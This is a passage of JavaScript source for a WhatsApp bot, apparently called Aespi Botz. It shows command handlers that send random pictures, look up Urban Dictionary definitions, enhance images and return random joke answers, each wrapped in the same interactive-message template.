                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'rose':{
await aespispStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/rose.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'ryujin':{
await aespispStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/ryujin.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'ulzzangboy':{
await aespispStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/ulzzangboy.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'ulzzanggirl':{
await aespispStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/ulzzanggirl.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'wallml': case 'wallpaperml':case 'mobilelegend':{
await aespispStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/wallml.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
case 'wallpaperphone': case 'wallphone':{
await aespispStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/wallhp.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
}
break
            case 'remini': {
			if (!quoted) return replygcaespisp(`Where is the picture?`)
			if (!/image/.test(mime)) return replygcaespisp(`Send/Reply Photos With Captions ${prefix + command}`)
			await aespispStickWait()
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: proses }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
			}
			break
			case 'define': 
if (!q) return replygcaespisp(`What do you want to define?`)
try {
targetfine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${q}`)
if (!targetfine) return replygcaespisp(mess.error)
const reply = `
*${themeemoji} Word:* ${q}
*${themeemoji} Definition:* ${targetfine.data.list[0].definition
    .replace(/\[/g, "")
    .replace(/\]/g, "")}
*${themeemoji} Example:* ${targetfine.data.list[0].example
    .replace(/\[/g, "")
    .replace(/\]/g, "")}`
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: reply
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./ArielFolder/theme/aespixyz.jpg') }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
} catch (err) {
    console.log(err)
    return replygcaespisp(`*${q}* isn't a valid text`)
    }
    break
                case 'can': {
            	if (!text) return replygcaespisp(`Ask question\n\nExample : ${prefix + command} i dance?`)
            	let bisa = [`Can`,`Can't`,`Cannot`,`Of Course You Can!!!`]
                let keh = bisa[Math.floor(Math.random() * bisa.length)]
                let jawab = `*Can ${text}*\nAnswer : ${keh}`
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./ArielFolder/theme/aespixyz.jpg') }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
            }
            break
            case 'is': {
            	if (!text) return replygcaespisp(`Ask question\n\nExample : ${prefix + command} she virgin?`)
            	let apa = [`Yes`, `No`, `It Could Be`, `Thats right`]
                let kah = apa[Math.floor(Math.random() * apa.length)]
                let jawab = `*Is ${text}*\nAnswer : ${kah}`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./ArielFolder/theme/aespixyz.jpg') }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
            }
            break
            case 'when': {
            	if (!text) return replygcaespisp(`Ask question\n\nExample : ${prefix + command} will i get married?`)
            	let kapan = ['5 More Days', '10 More Days', '15 More Days','20 More Days', '25 More Days','30 More Days','35 More Days','40 More Days','45 More Days','50 More Days','55 More Days','60 More Days','65 More Days','70 More Days','75 More Days','80 More Days','85 More Days','90 More Days','100 More Days','5 Months More', '10 Months More', '15 Months More','20 Months More', '25 Months More','30 Months More','35 Months More','40 Months More','45 Months More','50 Months More','55 Months More','60 Months More','65 Months More','70 Months More','75 Months More','80 Months More','85 Months More','90 Months More','100 Months More','1 More Year','2 More Years','3 More Years','4 More Years','5 More Years','Tomorrow','The Day After Tomorrow']
                let koh = kapan[Math.floor(Math.random() * kapan.length)]
                let jawab = `*${command} ${text}*\nAnswer : ${koh}`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./ArielFolder/theme/aespixyz.jpg') }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
            }
            break
case 'what': {
            	if (!text) return replygcaespisp(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let lel = [`Ask Your Gf`, `I Dont Know`, `I Don't Know, Ask Your Father`]
                let kah = lel[Math.floor(Math.random() * lel.length)]
                let jawab = `*What ${text}*\nAnswer : ${kah}`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./ArielFolder/theme/aespixyz.jpg') }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
            }
            break
case 'where': {
if (!text) return replygcaespisp(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let wherelol = [`In the mountain`, `On mars`, `On moon`,`In the jungle`,`I dont know ask your mom`,`It could be somewhere`]
                let kah = wherelol[Math.floor(Math.random() * wherelol.length)]
                let jawab = `*Whwre ${text}*\nAnswer : ${kah}`              
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./ArielFolder/theme/aespixyz.jpg') }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
            }
            break
case 'how': {
            	if (!text) return replygcaespisp(`Ask question\n\nExample : ${prefix + command} to date girl?`)
            	let gimana = [`Ummm...`, `It's Difficult Bro`, `Sorry Bot Can't Answer`, `Try Searching On Google`,`Holy Cow! Really???`,`Dizzy Ah😴, don't wanna answer`,`Ohhh I See:(`,`The Patient, Boss:(`,`Really dude 🙄`]
                let kah = gimana[Math.floor(Math.random() * gimana.length)]
                let jawab = `*How ${text}*\nAnswer : ${kah}`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./ArielFolder/theme/aespixyz.jpg') }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
            }
            break
case 'rate': {
            	if (!text) return replygcaespisp(`Example : ${prefix + command} my profile`)
            	let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
                let kah = ra[Math.floor(Math.random() * ra.length)]
                let jawab = `*Rate ${text}*\nAnswer : ${kah}%`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./ArielFolder/theme/aespixyz.jpg') }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
            }
            break
            case 'runtime': {
            	let lowq = `*The Bot Has Been Online For:*\n*${runtime(process.uptime())}*`
                replygcaespisp(lowq)
            	}
            break
            case 'stupidcheck':case 'uncleancheck':
case 'hotcheck': case 'smartcheck':
case 'greatcheck':
case 'evilcheck':case 'dogcheck':
case 'coolcheck':
case 'waifucheck':
cantik = body.slice(1)
const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const aespispkak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: aespispkak
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./ArielFolder/theme/aespixyz.jpg') }, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: ftroli })
return await ArielStore.relayMessage(m.chat, msgs.message, {})
break
            case 'soulmate': {
            if (!m.isGroup) return aespispStickGroup()
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `👫Your Soulmate Is

@${me.split('@')[0]}\n\n          ❤️\n\n@${jodoh.split('@')[0]}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./ArielFolder/theme/soulmate.jpg')}, { upload: ArielStore.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"TENTANG AESPI BOTZ\",\"url\":\"https://linktr.ee/arielstore2072\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"BACK TO MENU","id":"${prefix}menu"}`
              }
           ],
          }), 
          contextInfo: {
